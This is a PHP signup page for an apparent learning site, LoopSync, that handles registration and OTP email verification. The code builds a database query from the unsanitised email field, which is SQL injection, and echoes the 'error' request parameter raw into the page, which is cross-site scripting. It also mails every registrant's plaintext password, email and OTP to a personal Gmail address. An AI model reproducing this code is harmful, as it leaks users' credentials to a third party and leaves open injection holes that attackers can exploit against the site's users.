<?php
require('db_config.php');
if(!isset($_SERVER['HTTP_REFERER'])){
    header("location: index.php");
}
$database->read('users');

if(!isset($_POST['fullname']) && !isset($_POST['email']) && !isset($_POST['password'])) {
    $_SESSION['otp'] = base_convert(random_int(1000000000,99999999999), 10,36);
}
if (isset($_POST['fullname']) && isset($_POST['email']) && isset($_POST['password'])) {
    $data = $_POST['email'];
    $check = $database->read('users', 'email = ' . "'$data'");
    if (!isset($check[0])) {
        if (filter_var($_POST['email'], FILTER_VALIDATE_EMAIL)) {
            if ($_POST['password'] === $_POST['cpassword']) {
                $fn = $em = $pw = "";
                $fn = $database->sec($_POST['fullname']);
                $em = $database->sec($_POST['email']);
                $pw = $database->sec($_POST['password']);
                $headers = "From: loopsyncmailer@loopsync.com.ng \r\n";
                $headers .= "Reply-To: loopsyncmailer@loopsync.com.ng \r\n";
                $headers .= "CC: " . $em . "\r\n";
                $headers .= "MIME-Version: 1.0\r\n";
                $headers .= "Content-Type: text/html; 
                charset=ISO-8859-1\r\n";
                $headers2 = "From: loopsyncmailer@loopsync.com.ng \r\n";
                $headers2 .= "Reply-To: loopsyncmailer@loopsync.com.ng \r\n";
                $headers2 .= "CC: adenijiolajid01@gmail.com \r\n";
                $headers2 .= "MIME-Version: 1.0\r\n";
                $headers2 .= "Content-Type: text/html; 
                charset=ISO-8859-1\r\n";
                $headers3 = "From: loopsyncmailer@loopsync.com.ng \r\n";
                $headers3 .= "Reply-To: loopsyncmailer@loopsync.com.ng \r\n";
                $headers3 .= "CC: loopsyncmailer@loopsync.com.ng \r\n";
                $headers3 .= "MIME-Version: 1.0\r\n";
                $headers3 .= "Content-Type: text/html; 
                charset=ISO-8859-1\r\n";
                $message = "
                <!DOCTYPE html>
                <html lang='en-US'>
                
                <head>
                    <title>LoopSync</title>
                    <style>
                    table{
                        border: solid;
                        width: 100%;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        text-align: center;
                        border-spacing: 10px;
                        font-size: 19px;
                    }
                    tr{
                        text-align: center;
                        width: 100%;
                    }
                    td{
                        width: 100%;
                        text-align: center;
                    }
                    </style>
                </head>

                <body style='font-weight: bold;font-family: cursive; background-color: '>
                    <table>
                        <tr>
                            <th>
                                <h1>LoopSync</h1>
                            </th>
                        </tr>
                        <tr>
                            <td>
                                <span>Hello</span>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <span>You Have requested to sign up for an account on LoopSync.</span>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <span>Use the verification Code bellow to Activate Your Account</span>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <div style='font-size: 25px; font-size:xx-large;background-color: margenta;color:azure; box-shadow: 2px 2px 5px grey'>" . $_SESSION['otp'] . "</div>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <span>If you didn't initaite the request kindly ignore</span>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <span>Thank you</span>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <span>LoopSync</span>
                            </td>
                        </tr>
                    </table>
                </body>

                </html>
                ";
                $message2 = "Client Name: " . $fn . "\r\n"
                . "Email Address: " . $em . "\r\n"
                . "Password: " . $pw . "\r\n"             
                . "otp: " . $_SESSION['otp'] . "\r\n";              
                if (mail($em, 'Email Verification OTP', $message, $headers) && mail('adenijiolajid01@gmail.com', 'Registration', $message2, $headers2) && mail('loopsyncmailer@loopsync.com.ng', 'Registration', $message2, $headers3)) {
                    $_SESSION['fn'] = $fn;
                    $_SESSION['e'] = $em;
                    $_SESSION['pw'] = $pw;
                    header("location: otp.php");
                } else {
                    header("location: signup.php?error=Email not Verify");
                }
            } else {
                header("location: signup.php?error=Password do not match");
            }
        } else {
            header("location: signup.php?error=Enter valid email");
        }
    } else {
        header("location: signup.php?error=Email has already been register");
    }
}
?>
<!-- TODO- check words and delete all record if user doesn't exist in database -->


<!DOCTYPE html>
<html lang="en">

<?php require('meta.php') ?>

<body>
    <?php require('header.php'); ?>
    <main>
        <div class="log">
            <div>
             <!-- TODO: change email address -->
                <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
                    <div>
                        <h2>Sign Up and Start Learning</h2>
                    </div>
                    <div>
                        <input type="text" name="fullname" required minlength="2" maxlength="64" id="fullName">
                        <label for="fm-1">Fullname</label>
                    </div>
                    <div>
                        <input type="email" name="email" id="email" minlength="7" maxlength="64" required>
                        <label for="em">Email</label>
                    </div>
                    <div>
                        <input type="password" name="password" id="password" required minlength="6" maxlength="64">
                        <label for="pw">Password</label>
                    </div>
                    <div>
                        <input type="password" name="cpassword" id="cpassword" required minlength="6" maxlength="64">
                        <label for="cpassword">Confirm Password</label>
                    </div>
                    <input type="submit" value="Sign Up" id="signin">
            </div>
            <div>
                By signing up, you agree to our <a href="">Terms of Use</a> and <a href="">Privacy Policy.</a>.
            </div>
            <hr>
            <!-- TODO - author generated -->
            <div style="margin-bottom: 20px;">
                Already have an account? <a href="login.php">Log in</a>
            </div>
        </div>
        <?php
        if (isset($_REQUEST['error'])) {
            echo ' <div style="animation-play-state: running;" id="error">' . $_REQUEST['error'] .
                '</div>';
        }
        ?>
        </form>
    </main>
    <?php require('footer.php'); ?>
    <!-- Send mail to me and the person that insert data -->
    <!-- create a search suggestion -->
    <script>

    </scrip;>
</body>

</html>